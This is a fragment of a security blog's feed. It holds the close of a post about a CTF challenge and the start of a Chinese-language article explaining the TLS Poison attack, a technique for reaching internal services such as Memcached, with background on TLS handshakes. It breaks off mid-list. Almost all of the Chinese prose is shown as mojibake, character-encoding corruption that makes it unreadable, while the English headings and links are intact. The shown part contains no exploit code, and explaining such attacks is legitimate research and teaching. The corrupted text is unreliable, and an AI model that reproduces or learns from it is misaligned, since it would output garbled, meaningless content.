href="https://blog.zeddyu.info/2021/04/20/tls-poison/">ã€Šä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»ã€‹</a> ï¼ŒåŸºæœ¬ä¸Šç®—æ˜¯æŠŠ TLS Poison çš„ç†è®ºã€å®è·µã€ CTF åº”ç”¨éƒ½è®²äº†ä¸€éï¼Œæˆ–è®¸ä»¥åå¯èƒ½è¿˜ä¼šå¼„ä¸ª TLS Poison æ”»å‡» SMTP çš„é¶åœºï¼ˆåº”è¯¥ä¸å¤ªå¯èƒ½ï¼‰ï¼Œä½†æ˜¯ TLS Poison éœ€è¦æ¢ç´¢çš„å†…å®¹ä¾æ—§è¿˜æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚å¯¹äºæ˜¾å¼ FTPS çš„ TLS Poison åˆ©ç”¨åŒ–å·¥å…·ï¼Œå¦‚æœæ²¡æœ‰äº†<code>PASV</code>æ¼æ´ï¼ŒFTPS è¿˜æœ‰æ²¡æœ‰å…¶ä»–æ–¹å¼åˆ©ç”¨ç­‰ç­‰é—®é¢˜ï¼Œéƒ½æ˜¯è¿˜æœ‰å¾…å¤§å®¶è¿›ä¸€æ­¥å»æŒ–æ˜çš„ã€‚</p><p>è¿™äº›å¤©éƒ½èŠ±äº†å¾ˆå¤šç²¾åŠ›åœ¨éƒ¨åˆ†ç ”ç©¶ä¸Šï¼Œä¸€æ–¹é¢ç¡®å®æˆ‘è§‰å¾— TLS Poison æ˜¯ä¸€ä¸ªå¾ˆç²¾å½©çš„æ”»å‡»æ–¹å¼ï¼Œå°½ç®¡å®ƒå±€é™æ€§å¾ˆå¤§ï¼Œä½†æ˜¯è¿™ä¸ªæ”»å‡»æ•´ä½“æ„é€ åˆ©ç”¨éƒ½ç›¸å¯¹æ¯”è¾ƒå·§å¦™ï¼Œä¹Ÿæ˜¯å¯¹åœ¨ä¼—å¤šå¯¹ TLS å¯†ç ç®—æ³•çš„æ”»å‡»ä¸­ä»¤äººè€³ç›®ä¸€æ–°ï¼›ä¸€æ–¹é¢å¯¹äº CTF é¢˜ç›®ï¼Œå°¤å…¶æ˜¯ hxp è¿™ä¸ªé¢˜ç›®æˆ‘ä¸€ç›´è€¿è€¿äºæ€€ï¼Œå†µä¸”æ­£å¥½è¿™ä¸ªä¹Ÿæ˜¯ TLS Poison çš„æ·±å±‚æ¬¡åˆ©ç”¨ï¼Œè¿™ä¹Ÿæˆä¸ºäº†åæ¥æˆ‘æ•´ç† TLS Poison æ”»å‡»çš„åŠ¨åŠ›æ¥æºä¹‹ä¸€ï¼Œå¹¶ä¸”æˆ‘ä¹Ÿè§‰å¾— FTP çœŸæ˜¯ä¸ªéå¸¸æœ‰æ„æ€çš„åè®®ï¼Œè€Œè¿™é¢˜é¢„æœŸç”¨åˆ° FTPS å°±å¿…é¡»å¼„æ‡‚ TLS Poison ï¼Œæ‰€ä»¥å°±ä¸å¾—ä¸å»æŠŠ TLS Poison å¼„ä¸€éã€‚æ²¡å¼„ä¹‹å‰è¿˜ä»¥ä¸ºæ˜¯æ¯”è¾ƒéš¾çš„ï¼Œå› ä¸ºçœ‹åˆ°å¥½å‡ ä¸ªé€‰æ‰‹éƒ½é‡æ–°å¼„äº† DNS éƒ¨åˆ†ï¼Œç”šè‡³è¿˜éœ€è¦é‡å†™ä¸€ä¸ª DNS Server ï¼Œä¸è¿‡å¯¹äºæ¶æ„ TLS æœåŠ¡è¿™ä¸€å—ç¡®å®éœ€è¦æ”¹å†™ TLS æœåŠ¡æ¡†æ¶æ‰èƒ½åšã€‚</p><p>è¿˜æœ‰ä¸€æ–¹é¢æ˜¯ï¼Œæˆ‘ä¹‹å‰å‘æœ‹å‹åœˆæ¢è®¨ CTF ç›¸å…³ä»·å€¼è§‚çš„é—®é¢˜ï¼Œä»¥åŠ CTF æ˜¯å¦æ˜¯ä¿¡æ¯å®‰å…¨æœ€ä½³å…¥é—¨æ–¹å¼ï¼Œ@Anciety è¯„è®ºè¯´ CTF å¯èƒ½ä¸æ˜¯ä¿¡æ¯å®‰å…¨å…¥é—¨æ–¹å¼ï¼Œä½†æ˜¯ä»–è®¤ä¸ºæ˜¯ä¿¡æ¯å®‰å…¨ç ”ç©¶çš„å…¥é—¨æ–¹å¼ã€‚æ­£å¦‚ä»–æ‰€è¯´ï¼Œé€šè¿‡è¿™ä¸ª CTF é¢˜ç›®ï¼Œæˆ‘å¯¹ TLS Poison è¿›è¡Œäº†æ›´æ·±å…¥çš„æ¢ç©¶ï¼Œä¹Ÿæœ‰äº†æ›´å¤šçš„ç†è§£ï¼Œè¿™å¯èƒ½å°±æ˜¯ä¸€é“è‰¯å¥½çš„ CTF é¢˜ç›®ç»™å®‰å…¨ç ”ç©¶è€…å¸¦æ¥çš„å¥½å¤„ä¹‹ä¸€å§ï¼ŒåŒæ—¶ä¹Ÿå¸¦ç»™äº†æˆ‘å¾ˆå¤šå¿«ä¹ï¼Œä¹Ÿå¸Œæœ›ä»¥åèƒ½é‡åˆ°æ›´å¤šç±»ä¼¼ä¼˜ç§€çš„é¢˜ç›®ï¼Œèƒ½å¼•å¯¼ã€æ¨åŠ¨æˆ‘å»åšæ›´å¤šæœ‰æ„æ€æ›´æ·±å±‚æ¬¡çš„ç ”ç©¶ã€‚</p></body></html>]]></content>
        <author>
            <name><![CDATA[Zeddâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2021/04/20/tls-poison/</id>
        <title><![CDATA[ä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»]]></title>
        <updated>2021-08-12T09:17:22+08:00</updated>
        <link href="https://blog.zeddyu.info/2021/04/20/tls-poison/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2021/04/20/tls-poison/"><![CDATA[<html><head></head><body><p>è¿™æ˜¯ã€Šä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ XXX æ”»å‡»ã€‹ç³»åˆ—çš„ç¬¬äºŒç¯‡æ–‡ç« ï¼Œæœ¬ç¯‡æ–‡ç« ä¸»è¦è®²è¿° TLS Poison æ”»å‡»å¯¹åº”çš„ä¸‰ç§æ”»å‡»æ–¹å¼ã€ä¸€äº›å¯èƒ½ç®—æ˜¯â€œæ–°â€çš„ DNS Rebinding æŠ€å·§ä»¥åŠä¸€äº›å…³äº IP é€‰æ‹©æ¢ç´¢ç­‰å†…å®¹ã€‚</p><blockquote class="colorquote success"><p>æ–‡ç« é¦–å‘äºé›·ç¥ä¼—æµ‹ï¼Œåˆ†ä¸ºç³»åˆ—æ–‡ç« ï¼š</p><p>ä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»ï¼ˆä¸€ï¼‰<a href="https://mp.weixin.qq.com/s/tAba3-qb5YGtlzH7y6PFvg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/tAba3-qb5YGtlzH7y6PFvg</a></p><p>ä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»ï¼ˆäºŒï¼‰<a href="https://mp.weixin.qq.com/s/aIWcpIXs-jQoMXuEppj3TQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/aIWcpIXs-jQoMXuEppj3TQ</a></p><p>ä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»ï¼ˆä¸‰ï¼‰<a href="https://mp.weixin.qq.com/s/vBAeGaeBKnSyXUL_qmr7Gg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vBAeGaeBKnSyXUL_qmr7Gg</a></p><p>ä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»ï¼ˆå››ï¼‰<a href="https://mp.weixin.qq.com/s/YdV9Hlpz38d09JOdtf2PxA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YdV9Hlpz38d09JOdtf2PxA</a></p></blockquote><a id="more"></a><p>[TOC]</p><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>ä½¿ç”¨ã€Šä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ XXX æ”»å‡»ã€‹çš„æ ‡é¢˜æ˜¯ä¸ºäº†ç£ä¿ƒè‡ªå·±æŠŠä¸€ä¸ªæ”»å‡»çš„å°½å¯èƒ½å¤šçš„ç»†èŠ‚å°½å¯èƒ½çš„ææ‡‚ï¼Œä¹Ÿæ˜¯ä¸ºäº†æå‡è‡ªå·±çš„å†™ä½œä»¥åŠè¡¨è¿°æ°´å¹³ã€‚æœ¬æ–‡æ—¨åœ¨å¸®åŠ©å¤§å®¶äº†è§£å­¦ä¹  TLS Poison æ”»å‡»ï¼Œå¸Œæœ›é€šè¿‡ä¸€ç¯‡æ–‡ç« è®©å¤§å®¶è¯»æ‡‚ TLS Poison æ”»å‡»ï¼Œä½†æ˜¯ä»…ä»…ç½‘ç»œåè®®æ¶‰åŠåˆ°å¾ˆå¤šå†…å®¹ï¼Œé æœ¬æ–‡æ˜¯ä¸å¯èƒ½å®Œå…¨è¯»æ‡‚çš„ï¼Œæœ¬æ–‡çš„å†…å®¹ä¹Ÿå¹¶éå®Œå…¨æ­£ç¡®ï¼Œæ‰€ä»¥ä¹Ÿå¸Œæœ›å¤§å®¶æŠ±ç€æ€€ç–‘çš„æ€åº¦åˆç†å¯¹æ–‡ç« æå‡ºè´¨ç–‘ã€‚</p><p>æœ¬æ–‡ä¸»è¦æ˜¯å¯¹ <a href="https://www.blackhat.com/us-20/briefings/schedule/#when-tls-hacks-you-19446" target="_blank" rel="noopener">Black Hat USA 2020 - When TLS Hacks You</a> è®®é¢˜çš„æ•´ç†ä¸å¤ç›˜ï¼Œè¯¥æ”»å‡»æ˜¯ä¸€ç§åˆ©ç”¨ TLS åè®®ç‰¹æ€§ç»“åˆå®¢æˆ·ç«¯å®ç°ç¼ºé™·è¾¾åˆ°æ”»å‡»å†…ç½‘åº”ç”¨çš„æ”»å‡»æ–¹å¼ï¼Œå¯ä»¥è¾¾åˆ°ä»»æ„å†™å…¥ Memcached ç­‰å†…ç½‘æœåŠ¡çš„æ”»å‡»æ•ˆæœï¼Œè¿›è€Œé…åˆå…¶ä»–æ¼æ´é€ æˆ RCE ç­‰å±å®³ã€‚</p><p>è¿™æ˜¯å»å¹´çš„åœ¨ black hat USA æå‡ºçš„ä¸€é¡¹æ”»å‡»æ–¹å¼ï¼Œä½†æ˜¯ä½œè€…åœ¨æå‡ºè¿™ä¸ªæ”»å‡»æ–¹å¼åï¼Œç”±äºç§ç§å› ç´ ï¼Œä»–æ”¾å‡ºæ¥çš„ demo å¹¶ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œæ‰€ä»¥åœ¨å¯¹è¯¥é¡¹çš„ç ”ç©¶å¤ç°ä¸­æ•´ç†äº†å¾ˆå¤šæ”»å‡»ç»†èŠ‚ï¼Œä»¥åŠä¸€äº›å¯ä»¥æ‹“å±•çš„åœ°æ–¹ï¼Œè¿˜æœ‰ä¸€äº›å…³äºè®¡ç®—æœºç§‘å­¦çŸ¥è¯†çš„æ¢ç´¢ã€‚</p><p>æœ¬æ–‡ä¸»è¦åˆ†æˆä¸‰éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†ä¸»è¦<strong>ç®€å•</strong>è®²è¿°ä¸€äº›å¿…è¦çš„èƒŒæ™¯çŸ¥è¯†ï¼Œç¬¬äºŒéƒ¨åˆ†ä¼šè¯¦ç»†è®°å½•ä¸‰ç§æ”»å‡»æ–¹å¼çš„å®ç°æ­¥éª¤ï¼Œç¬¬ä¸‰éƒ¨åˆ†ä¼šè®²è¿°ä¸€äº›å…³äºåœ¨å¤ç°è¿‡ç¨‹ä¸­çš„ä¸€äº›æ€è€ƒä»¥åŠç›¸å…³æ¢ç´¢çš„å†…å®¹ã€‚å¦‚æœè¿˜æœ‰åç»­çš„è¿›å±•ï¼Œæˆ‘ä¹Ÿä¼šåŒæ­¥åˆ°è‡ªå·±çš„ä¸ªäººåšå®¢ä¸Šï¼Œæ¬¢è¿å…³æ³¨ï¼Œä»¥åŠå‰æ¥äº¤æµï¼š<a href="https://blog.zeddyu.info/">https://blog.zeddyu.info/</a></p><p>å¦‚æœå¯¹è¯¥ç¯‡æ–‡ç« æœ‰ä»»ä½•ç–‘é—®æˆ–è€…è´¨ç–‘ï¼Œæ¬¢è¿æ¥ä¿¡ï¼šecho emVkZHl1Lmx1QGdtYWlsLmNvbQ==|base64 -d</p><p>æ¬¢è¿å¯¹åè®®å®‰å…¨ç­‰å†…å®¹æ„Ÿå…´è¶£çš„åŒå­¦ä¸€èµ·äº¤æµå­¦ä¹ ï¼</p><p><strong>PS: å¦‚æ— ç‰¹æ®Šè¯´æ˜ï¼Œæ•´ä¸ªå®éªŒèƒŒæ™¯å‡åŸºäº Ubuntu 20.04 LTS ï¼Œcurl 7.68.0 build with OpenSSL/1.1.1f  ï¼Œåæ–‡æåˆ°çš„ IPv6 å‡æŒ‡çš„æ˜¯  IPv4-mapped IPv6 addresses è¿™ç±»åœ°å€</strong></p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="TLS-Overview"><a href="#TLS-Overview" class="headerlink" title="TLS Overview"></a>TLS Overview</h3><p><strong>ä¼ è¾“å±‚å®‰å…¨æ€§åè®®</strong>ï¼ˆè‹±è¯­ï¼š<strong>T</strong>ransport <strong>L</strong>ayer <strong>S</strong>ecurityï¼Œç¼©å†™ï¼š<strong>TLS</strong>ï¼‰åŠå…¶å‰èº«<strong>å®‰å…¨å¥—æ¥å±‚</strong>ï¼ˆè‹±è¯­ï¼š<strong>S</strong>ecure <strong>S</strong>ockets <strong>L</strong>ayerï¼Œç¼©å†™ï¼š<strong>SSL</strong>ï¼‰æ˜¯ä¸€ç§å®‰å…¨åè®®ï¼Œç›®çš„æ˜¯ä¸ºäº’è”ç½‘é€šä¿¡æä¾›å®‰å…¨åŠæ•°æ®å®Œæ•´æ€§ä¿éšœã€‚ç½‘æ™¯å…¬å¸ï¼ˆNetscapeï¼‰åœ¨1994å¹´æ¨å‡ºé¦–ç‰ˆç½‘é¡µæµè§ˆå™¨ï¼ç½‘æ™¯å¯¼èˆªè€…æ—¶ï¼Œæ¨å‡ºHTTPSåè®®ï¼Œä»¥SSLè¿›è¡ŒåŠ å¯†ï¼Œè¿™æ˜¯SSLçš„èµ·æºã€‚IETFå°†SSLè¿›è¡Œæ ‡å‡†åŒ–ï¼Œ1999å¹´å…¬å¸ƒTLS 1.0æ ‡å‡†æ–‡ä»¶ï¼ˆRFC 2246ï¼‰ã€‚éšååˆå…¬å¸ƒTLS 1.1ï¼ˆRFC 4346ï¼Œ2006å¹´ï¼‰ã€TLS 1.2ï¼ˆRFC 5246ï¼Œ2008å¹´ï¼‰å’ŒTLS 1.3ï¼ˆRFC 8446ï¼Œ2018å¹´ï¼‰ã€‚åœ¨æµè§ˆå™¨ã€ç”µå­é‚®ä»¶ã€å³æ—¶é€šä¿¡ã€VoIPã€ç½‘ç»œä¼ çœŸç­‰åº”ç”¨ç¨‹åºä¸­ï¼Œå¹¿æ³›ä½¿ç”¨è¿™ä¸ªåè®®ã€‚è®¸å¤šç½‘ç«™ï¼Œå¦‚Googleã€Facebook ç­‰ä¹Ÿä»¥è¿™ä¸ªåè®®æ¥åˆ›å»ºå®‰å…¨è¿çº¿ï¼Œå‘é€èµ„æ–™ã€‚ç›®å‰å·²æˆä¸ºäº’è”ç½‘ä¸Šä¿å¯†é€šä¿¡çš„å·¥ä¸šæ ‡å‡†ã€‚</p><p>Netscape å¼€å‘äº†åä¸ºå®‰å…¨å¥—æ¥å­—å±‚ï¼ˆSecure Socket Layerï¼ŒSSLï¼‰çš„ä¸Šä¸€ä»£åŠ å¯†åè®®ï¼ŒTLS ç”±æ­¤æ¼”å˜è€Œæ¥ã€‚TLS 1.0 ç‰ˆçš„å¼€å‘å®é™…ä¸Šå§‹äº SSL 3.1 ç‰ˆï¼Œä½†åè®®çš„åç§°åœ¨å‘å¸ƒä¹‹å‰è¿›è¡Œäº†æ›´åï¼Œä»¥è¡¨æ˜å®ƒä¸å†ä¸ Netscape å…³è”ã€‚ç”±äºè¿™ä¸ªå†å²åŸå› ï¼ŒTLS å’Œ SSL è¿™ä¸¤ä¸ªæœ¯è¯­æœ‰æ—¶ä¼šäº’æ¢ä½¿ç”¨ã€‚</p><p>è¯¥åè®®ç”±ä¸¤å±‚ç»„æˆï¼š TLS è®°å½•åè®®ï¼ˆTLS Recordï¼‰å’Œ TLS æ¡æ‰‹åè®®ï¼ˆTLS Handshakeï¼‰ã€‚</p><p><strong>å› ä¸ºæœ¬æ–‡ä¾§é‡ç‚¹å¹¶é TLS æœ¬èº«çš„åŠ å¯†ç®—æ³•æµç¨‹ï¼Œæ‰€ä»¥ä¼šå¿½ç•¥å¾ˆå¤šå¯†ç ç®—æ³•æµç¨‹ï¼Œåªæå…¶ä¸­å¯¹æˆ‘ä»¬åç»­æ”»å‡»ç›¸å…³çš„éƒ¨åˆ†ï¼Œå¯†ç ç®—æ³•éƒ¨åˆ†æ„Ÿå…´è¶£çš„è¯»è€…å¯ä»¥è‡ªè¡Œæœç´¢äº†è§£ã€‚</strong></p><h4 id="TLS-Handshake"><a href="#TLS-Handshake" class="headerlink" title="TLS Handshake"></a>TLS Handshake</h4><p>TLS æ¡æ‰‹æ˜¯å¯åŠ¨ä½¿ç”¨ TLS åŠ å¯†çš„é€šä¿¡ä¼šè¯çš„è¿‡ç¨‹ã€‚åœ¨ TLS æ¡æ‰‹æœŸé—´ï¼Œä¸¤ä¸ªé€šä¿¡æ–¹äº¤æ¢æ¶ˆæ¯ä»¥ç›¸äº’ç¡®è®¤ï¼Œå½¼æ­¤éªŒè¯ï¼Œç¡®ç«‹å®ƒä»¬å°†ä½¿ç”¨çš„åŠ å¯†ç®—æ³•ï¼Œå¹¶å°±ä¼šè¯å¯†é’¥è¾¾æˆå…±è¯†ã€‚å®ƒå®šä¹‰äº†æ¶ˆæ¯çš„æ ¼å¼å’Œäº¤æ¢çš„é¡ºåºã€‚è¿™äº›å¯ä»¥æ ¹æ®å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„éœ€æ±‚è€Œå˜åŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ‰å‡ ç§å¯èƒ½çš„ç¨‹åºæ¥å»ºç«‹è¿æ¥ã€‚åˆå§‹äº¤æ¢çš„ç»“æœæ˜¯TLSè¿æ¥æˆåŠŸï¼ˆåŒæ–¹éƒ½å‡†å¤‡å¥½ç”¨TLSä¼ è¾“åº”ç”¨æ•°æ®ï¼‰æˆ–å‘å‡ºè­¦æŠ¥æ¶ˆæ¯ã€‚</p><p>æ¯å½“ç”¨æˆ·é€šè¿‡ HTTPS å¯¼èˆªåˆ°ç½‘ç«™ï¼Œå¹¶ä¸”æµè§ˆå™¨é¦–å…ˆå¼€å§‹æŸ¥è¯¢ç½‘ç«™çš„æºç«™æœåŠ¡å™¨æ—¶ï¼Œéƒ½ä¼šè¿›è¡Œ TLS æ¡æ‰‹ã€‚æ¯å½“å…¶ä»–ä»»ä½•é€šä¿¡ä½¿ç”¨ HTTPSï¼ˆåŒ…æ‹¬ API è°ƒç”¨å’Œ HTTPS ä¸Šçš„ DNS æŸ¥è¯¢ï¼‰æ—¶ï¼Œä¹Ÿä¼šå‘ç”Ÿ TLS æ¡æ‰‹ã€‚é€šè¿‡ TCP æ¡æ‰‹æ‰“å¼€ TCP è¿æ¥åï¼Œå°†å‘ç”Ÿ TLS æ¡æ‰‹ã€‚</p><p>åœ¨ TLS æ¡æ‰‹è¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¸€åŒæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><ul><li>æŒ‡å®šå°†è¦ä½¿ç”¨çš„ TLS ç‰ˆæœ¬ï¼ˆTLS 1.0ã€1.2ã€1.3 ç­‰ï¼‰</li><li>å†³å®šå°†è¦ä½¿ç”¨å“ªäº›å¯†ç å¥—ä»¶</li><li>é€šè¿‡æœåŠ¡å™¨çš„å…¬é’¥å’Œ SSL è¯ä¹¦é¢å‘æœºæ„çš„æ•°å­—ç­¾åæ¥éªŒè¯æœåŠ¡å™¨çš„èº«ä»½</li><li>ç”Ÿæˆä¼šè¯å¯†é’¥ï¼Œä»¥åœ¨æ¡æ‰‹å®Œæˆåä½¿ç”¨å¯¹ç§°åŠ å¯†</li><li>æ£€æŸ¥æ˜¯å¦éœ€è¦æ¢å¤ä¼šè¯</li></ul><p>TLS æ¡æ‰‹æ˜¯ç”±å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨äº¤æ¢çš„ä¸€ç³»åˆ—æ•°æ®æŠ¥æˆ–æ¶ˆæ¯ã€‚TLS æ¡æ‰‹æ¶‰åŠå¤šä¸ªæ­¥éª¤ï¼Œå› ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨è¦äº¤æ¢å®Œæˆæ¡æ‰‹å’Œè¿›è¡Œè¿›ä¸€æ­¥å¯¹è¯æ‰€éœ€çš„ä¿¡æ¯ã€‚ TLS æ¡æ‰‹çš„ç¡®åˆ‡æ­¥éª¤å°†æ ¹æ®æ‰€ä½¿ç”¨çš„å¯†é’¥äº¤æ¢ç®—æ³•çš„ç±»å‹ä»¥åŠåŒæ–¹æ”¯æŒçš„å¯†ç å¥—ä»¶è€Œæœ‰æ‰€ä¸åŒï¼ŒRSA å¯†é’¥äº¤æ¢ç®—æ³•æœ€ä¸ºå¸¸ç”¨ã€‚ä½†æ˜¯å¹¶éæ‰€æœ‰ TLS æ¡æ‰‹å‡ä½¿ç”¨éå¯¹ç§°åŠ å¯†ï¼ˆå…¬é’¥å’Œç§é’¥ï¼‰ï¼Œä½†å¹¶éå…¨éƒ½ä¼šåœ¨ç”Ÿæˆä¼šè¯å¯†é’¥çš„è¿‡ç¨‹ä¸­ä½¿ç”¨ç§é’¥ã€‚ä¾‹å¦‚ Diffie-Hellman æ¡æ‰‹ç­‰ï¼Œè¿™é‡Œä¸åšè¿‡å¤šä»‹ç»ã€‚</p><h4 id="TLS-Record"><a href="#TLS-Record" class="headerlink" title="TLS Record"></a>TLS Record</h4><p>TLS Record åè®®ä½¿ç”¨æ¡æ‰‹è¿‡ç¨‹ä¸­åˆ›å»ºçš„å¯†é’¥æ¥ç¡®ä¿åº”ç”¨æ•°æ®çš„å®‰å…¨ã€‚è®°å½•åè®®è´Ÿè´£ä¿æŠ¤åº”ç”¨æ•°æ®çš„å®‰å…¨ï¼Œå¹¶éªŒè¯å…¶å®Œæ•´æ€§å’Œæ¥æºã€‚å®ƒç®¡ç†ä»¥ä¸‹å†…å®¹ï¼šå°†ä¼ å‡ºçš„æ¶ˆæ¯åˆ†ä¸ºå¯ç®¡ç†çš„å—ã€é‡æ–°ç»„åˆä¼ å…¥çš„æ¶ˆæ¯ã€å‹ç¼©å¤–å‘æŠ¥æ–‡å—å’Œè§£å‹æ¥æ”¶æŠ¥æ–‡å—ï¼ˆå¯é€‰ï¼‰ã€å°†ä¿¡æ¯éªŒè¯ç ï¼ˆMessage Authentication Code, MACï¼‰åº”ç”¨åˆ°å¤–å‘ä¿¡æ¯å¹¶ä½¿ç”¨ MAC éªŒè¯æ¥æ”¶ä¿¡æ¯ã€åŠ å¯†å¤–å‘æŠ¥æ–‡å’Œè§£å¯†æ¥æ”¶æŠ¥æ–‡ã€‚å½“ TLS Record åè®®å®Œæˆåï¼Œå¤–å‘åŠ å¯†æ•°æ®è¢«ä¼ åˆ°ä¼ è¾“æ§åˆ¶åè®®ï¼ˆTCPï¼‰å±‚è¿›è¡Œä¼ è¾“ã€‚</p><h3 id="TLS-1-2"><a href="#TLS-1-2" class="headerlink" title="TLS 1.2"></a>TLS 1.2</h3><h4 id="TLS-1-2-HankShake"><a href="#TLS-1-2-HankShake" class="headerlink" title="TLS 1.2 HankShake"></a>TLS 1.2 HankShake</h4><p>ç”±äºå†å²åŸå› ï¼ŒTLS çš„å‰èº« SSL å·²ç»è¢«åºŸå¼ƒï¼›ç°è¡Œè¶‹åŠ¿ä¸­ï¼Œä¸»æµ TLS ç‰ˆæœ¬ä¸º 1.2 ï¼Œå¹¶ä¸” 1.2 å¯¹äº 1.1 çš„æ”¹åŠ¨ç›¸å¯¹äºæœ¬æ–‡é‡ç‚¹æ¥è¯´å¹¶ä¸é‡è¦ï¼Œå¹¶ä¸”ç°åœ¨å¤„äºæ¨å¹¿ 1.3 çš„æ—¶ä»£ï¼Œæˆ‘ä»¬è¿™é‡Œä» TLS 1.2 å¼€å§‹è®²èµ·ã€‚</p><ol><li><p><strong>Client hello:</strong> å®¢æˆ·ç«¯å‘é€ ClientHello æ¶ˆæ¯ï¼ŒæŒ‡å®šå®ƒæ”¯æŒçš„æœ€é«˜ TLS åè®®ç‰ˆæœ¬ã€ä¸€ä¸ªéšæœºæ•°ã€ä¸€ä¸ªå»ºè®®çš„å¯†ç å¥—ä»¶åˆ—è¡¨å’Œå»ºè®®çš„å‹ç¼©æ–¹æ³•ã€‚å¦‚æœå®¢æˆ·ç«¯è¯•å›¾æ‰§è¡Œæ¢å¤æ¡æ‰‹ï¼Œå®ƒå¯èƒ½ä¼šå‘é€ä¸€ä¸ªä¼šè¯ ID ã€‚å¦‚æœå®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨åº”ç”¨å±‚åè®®åå•†ï¼Œå®ƒå¯èƒ½åŒ…æ‹¬ä¸€ä¸ªæ”¯æŒçš„åº”ç”¨åè®®åˆ—è¡¨ï¼Œä¾‹å¦‚ HTTP/2 ã€‚</p></li><li><p><strong>Server hello:</strong> æœåŠ¡å™¨ä»¥ ServerHello æ¶ˆæ¯ä½œå‡ºå“åº”ï¼ŒåŒ…å«ä»å®¢æˆ·ç«¯æä¾›çš„é€‰æ‹©ä¸­é€‰æ‹©çš„åè®®ç‰ˆæœ¬ã€éšæœºæ•°ã€å¯†ç å¥—ä»¶å’Œå‹ç¼©æ–¹æ³•ã€‚ä¸ºäº†ç¡®è®¤æˆ–å…è®¸æ¢å¤æ¡æ‰‹ï¼ŒæœåŠ¡å™¨å¯ä»¥å‘é€ä¸€ä¸ªä¼šè¯ ID ã€‚é€‰æ‹©çš„åè®®ç‰ˆæœ¬åº”è¯¥æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½æ”¯æŒçš„æœ€é«˜ç‰ˆæœ¬ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå®¢æˆ·ç«¯æ”¯æŒ TLS 1.1 ç‰ˆæœ¬ï¼ŒæœåŠ¡å™¨æ”¯æŒ 1.2 ç‰ˆæœ¬ï¼Œåˆ™åº”é€‰æ‹© 1.1 ç‰ˆæœ¬ï¼›ä¸åº”é€‰æ‹© 1.2 ç‰ˆæœ¬ã€‚</p></li><li><p>(Optional) <strong>Certificate:</strong> æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€è¯ä¹¦æˆ–è¯ä¹¦é“¾ã€‚ è¯ä¹¦é“¾é€šå¸¸ä»¥æœåŠ¡å™¨çš„å…¬é’¥è¯ä¹¦å¼€å§‹ï¼Œå¹¶ä»¥è¯ä¹¦é¢å‘æœºæ„çš„æ ¹è¯ä¹¦ç»“æŸã€‚ è¯¥æ¶ˆæ¯æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯åœ¨éœ€è¦æœåŠ¡å™¨èº«ä»½éªŒè¯æ—¶ä½¿ç”¨ã€‚</p></li><li><p>(Optional) <strong>Certificate request:</strong> å¦‚æœæœåŠ¡å™¨å¿…é¡»å¯¹å®¢æˆ·ç«¯è¿›è¡Œèº«ä»½éªŒè¯ï¼Œåˆ™å®ƒå°†å‘å®¢æˆ·ç«¯å‘é€è¯ä¹¦è¯·æ±‚ã€‚ åœ¨Internetåº”ç”¨ç¨‹åºä¸­ï¼Œå¾ˆå°‘å‘é€æ­¤æ¶ˆæ¯ã€‚</p></li><li><p>(Optional) <strong>Server key exchange:</strong> å¦‚æœæ¥è‡ªè¯ä¹¦çš„å…¬é’¥ä¿¡æ¯ä¸è¶³ä»¥è¿›è¡Œå¯†é’¥äº¤æ¢ï¼Œåˆ™æœåŠ¡å™¨ä¼šå‘å®¢æˆ·ç«¯å‘é€æœåŠ¡å™¨å¯†é’¥äº¤æ¢æ¶ˆæ¯ã€‚ ä¾‹å¦‚ï¼Œåœ¨åŸºäºDiffie-Hellmanï¼ˆDHï¼‰çš„å¯†ç å¥—ä»¶ä¸­ï¼Œæ­¤æ¶ˆæ¯åŒ…å«æœåŠ¡å™¨çš„DHå…¬é’¥ã€‚</p></li><li><p><strong>Server hello done:</strong> æœåŠ¡å™¨å‘Šè¯‰å®¢æˆ·ç«¯å®ƒå·²ç»å®Œæˆäº†å…¶åˆå§‹åå•†æ¶ˆæ¯ã€‚</p></li><li><p>(Optional)<strong>Certificate</strong>: å¦‚æœæœåŠ¡å™¨ä»å®¢æˆ·ç«¯è¯·æ±‚è¯ä¹¦ï¼Œåˆ™å®¢æˆ·ç«¯å°†å‘é€å…¶è¯ä¹¦é“¾ï¼Œå°±åƒæœåŠ¡å™¨ä¹‹å‰æ‰€åšçš„ä¸€æ ·ã€‚</p><p><strong>Note:</strong> åªæœ‰å°‘æ•°InternetæœåŠ¡å™¨åº”ç”¨ç¨‹åºè¦æ±‚å®¢æˆ·ç«¯æä¾›è¯ä¹¦ã€‚</p></li><li><p><strong>Client key exchange:</strong> 